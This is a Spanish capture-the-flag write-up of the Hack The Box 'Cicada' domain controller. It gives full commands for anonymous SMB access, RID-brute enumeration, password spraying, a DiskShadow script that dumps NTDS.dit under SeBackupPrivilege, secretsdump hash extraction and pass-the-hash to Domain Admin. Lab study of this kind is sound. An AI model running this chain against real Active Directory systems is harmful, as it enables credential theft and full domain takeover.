# HTB — Cicada (Writeup)

## Información Inicial

- **Target:** `10.129.231.149` (DC)
- **Dominio:** `cicada.htb`
- **Hostname:** `CICADA-DC`
- **SO:** Windows Server 2022 (AD Domain Controller)

---

## 1. Enumeración Inicial

### Nmap

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,5985,62579 -sC -sV -Pn --min-rate 4500 -oN exhaustivo 10.129.231.149
```

**Hallazgos importantes:**

- `53` DNS
- `88` Kerberos
- `389/636/3268` LDAP (Active Directory)
- `445` SMB
- `5985` WinRM (posible shell si conseguimos credenciales)
- SMB signing requerido → no relay, pero sí autenticación normal.

---

## 2. Acceso Inicial: Null Session en SMB + Archivo de HR

Se pudo conectar con **SMB sin credenciales** (null session) y descargar un archivo del share **HR**.

Ese archivo contenía una contraseña:

> **No teníamos ningún usuario aún, solo una contraseña.**

Esto es clave porque en AD muchas veces se reutilizan passwords entre usuarios.

---

## 3. Enumeración del Dominio vía RPC (sin usuario)

Como el DC tenía `135` (RPC) abierto, se intentó enumerar usando la contraseña encontrada.

```bash
rpcclient -U ' ' 10.129.231.149
```

RPC pidió password para WORKGROUP. Se utilizó la contraseña obtenida desde HR.

---

## 4. Enumeración de SIDs + RID Discovery

Dentro de `rpcclient`, enumeramos SIDs:

```bash
rpcclient $> lsaenumsid
```

Dos entradas llamaron la atención porque parecían objetos del dominio:

```bash
S-1-5-21-917908876-1423158569-3159038727-1601
S-1-5-21-917908876-1423158569-3159038727-1109
```

Para resolver el nombre asociado a esos SIDs:

```bash
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1601
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1109
```

Resultado:

- `CICADA\emily.oscars`
- `CICADA\Dev Support`

---

## 5. RID Bruteforce Manual → Confirmación

Probando un RID cercano:

```bash
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1108
```

Se obtuvo:

- `CICADA\david.orelious`

Esto confirmó que el dominio permitía **RID cycling / RID bruteforce**, así que automatizamos.

---

## 6. Script para Enumerar Usuarios por RID

Se creó un script para probar RIDs comunes (500–2000):

```bash
#!/bin/bash
TARGET="10.129.231.149"
PASSWORD="Cicada\$M6Corpb*@Lp#nZp!8"
BASE_SID="S-1-5-21-917908876-1423158569-3159038727"
OUTPUT="usuarios_enumerados.txt"

> $OUTPUT

for rid in $(seq 500 2000); do
    SID="${BASE_SID}-${rid}"
    RESULT=$(rpcclient -U "%${PASSWORD}" -c "lookupsids ${SID}" $TARGET 2>/dev/null)

    if echo "$RESULT" | grep -q "CICADA"; then
        echo "$RESULT" | tee -a $OUTPUT
    fi
done
```

Usuarios encontrados:

- `john.smoulder`
- `sarah.dantelia`
- `michael.wrightson`
- `david.orelious`
- `emily.oscars`
## Nota: Enumeración RID más simple usando `guest`

Durante la enumeración inicial intenté obtener usuarios con RID bruteforce usando herramientas como `netexec` (`--rid-brute`), pero al hacerlo sin especificar el usuario `guest` **no se enumeraban correctamente los usuarios del dominio**.

Por esta razón terminé usando `rpcclient + lookupsids` y automatizando la enumeración con un script.

Sin embargo, después me di cuenta de que era suficiente con ejecutar RID bruteforce autenticando como `guest` (sin contraseña), lo cual sí permite enumerar los usuarios del dominio de forma directa:

```bash
netexec smb 10.129.236.196 -u guest -p '' --rid-brute
```

Esto devuelve los mismos objetos (usuarios/grupos) que enumeré manualmente con `lookupsids`, pero de forma mucho más rápida y limpia.

> En esta resolución utilicé el método con script porque fue el primer enfoque que funcionó durante la explotación, pero en un escenario real la opción recomendada sería probar primero `--rid-brute` con `guest`.

---

## 7. Password Spray con la contraseña inicial

Ya con usuarios, se realizó password spray usando la contraseña encontrada.

Se detectó que funcionaba para:

 `cicada.htb\michael.wrightson`

Ejemplo con NetExec:

```bash
netexec smb 10.129.236.196 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

---

## 8. Enumeración AD con credenciales válidas (RPC)

Con acceso real como Michael, RPC permite más queries:

```bash
rpcclient -U 'michael.wrightson' 10.129.236.196
```

Enumeramos usuarios del dominio:

```bash
rpcclient $> enumdomusers
```

---

## 9. Password en Description (AD Misconfiguration)

Se revisó información de un usuario específico:

```bash
rpcclient $> queryuser 0x454
```

Output relevante:

```bash
Description : Just in case I forget my password is aRt$Lp#7t*VQ!3
```

 Credenciales encontradas:

- **Usuario:** `david.orelious`
- **Password:** `aRt$Lp#7t*VQ!3`

---

## 10. Acceso a SMB DEV → Credenciales en Script

Con David se accedió al share `DEV`:

```bash
smbclient //10.129.236.196/DEV -U david.orelious
```

Se descargó:

- `Backup_script.ps1`
    

El script contenía credenciales hardcodeadas:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

🎯 Credenciales encontradas:

- **Usuario:** `emily.oscars`
- **Password:** `Q!3@Lp#M6b*7t*Vt`

---

## 11. Acceso por WinRM (User Flag)

WinRM estaba abierto (`5985`), así que se obtuvo shell:

```bash
evil-winrm -i 10.129.236.196 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

---

# Privilege Escalation — SeBackupPrivilege (Backup Operators)

## 12. Enumeración de Privilegios

En la sesión:

```powershell
whoami /all
```

El usuario pertenecía a:

- `BUILTIN\Backup Operators`

Lo cual otorga:

- `SeBackupPrivilege`
- `SeRestorePrivilege`

Esto permite leer archivos protegidos como:

- `C:\Windows\NTDS\ntds.dit`
- HKLM\SYSTEM

---

## 13. Problema: NTDS está en uso

No se puede copiar directamente porque AD lo mantiene bloqueado.

---

## 14. Solución: Volume Shadow Copy con DiskShadow

Creamos un script DiskShadow en Linux:

```bash
cat > diskshadow.txt << 'EOF'
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
EOF

unix2dos diskshadow.txt
```

Subimos y ejecutamos:

```powershell
upload diskshadow.txt
diskshadow /s diskshadow.txt
```

Esto expone la copia como `E:\`

---

## 15. Dump de NTDS + SYSTEM

Desde la shadow copy:

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save hklm\system C:\Temp\system.bak
```

Descargamos:

```powershell
download C:\Temp\ntds.dit
download C:\Temp\system.bak
```

---

## 16. Extracción de Hashes (Secretsdump)

```bash
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

Hash del Administrator:

```
Administrator:500:...:2b87e7c93a3e8a0ea4a5819370:::
```

---

## 17. Pass-the-Hash → Domain Admin

```bash
evil-winrm -i 10.129.236.196 -u Administrator -H 2b87e7c93a3e8a0ea4a581937
```

Acceso total al DC → Root flag.

---

# Resumen Final del Ataque

1. **Null session SMB** → archivo HR con password
2. **RPC + lookupsids** → RID cycling para obtener usuarios
3. **Password spray** → acceso como `michael.wrightson`
4. **queryuser** → password en description (`david.orelious`)
5. **SMB DEV** → script PS1 con password (`emily.oscars`)
6. **WinRM** → shell
7. **Backup Operators** → `SeBackupPrivilege`
8. **DiskShadow + NTDS dump**
9. **Secretsdump** → hash de Administrator
10. **Pass-the-Hash** → DA / Root

---

